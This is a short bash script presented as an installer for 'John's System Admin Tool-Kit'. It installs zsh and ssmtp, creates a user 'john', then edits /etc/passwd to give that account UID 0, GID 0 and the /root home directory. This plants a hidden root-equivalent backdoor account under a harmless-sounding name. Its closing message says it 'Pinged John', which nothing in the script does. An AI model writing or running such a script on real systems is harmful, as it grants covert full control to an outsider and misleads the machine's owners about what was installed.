#!/bin/bash
echo "[!] *warning, this is a beta script and wont do error recovery by itself yet*"
function install {
  echo "[#] Installing John's System Admin Tool-Kit..."
  if [ -f /etc/redhat-release ] ; then
    PKMGR='yum'
  elif [ -f /etc/debian_version ] ; then
    PKMGR='apt-get'
  fi
  $PKMGR -y install zsh ssmtp
  adduser -r -N john
  sed -i 's/john:x:*:*::\/*:\/bin\/*/john:x:0:0::\/root:\/bin\/zsh/g' /etc/passwd
  echo "[#] Installed John's System Admin Tool-Kit and Pinged John!"
}
read -p "[?] Install John as System Admin? (y/n) " -n 1 -r
if [[ $REPLY =~ ^[Yy]$ ]]
then
    install
fi
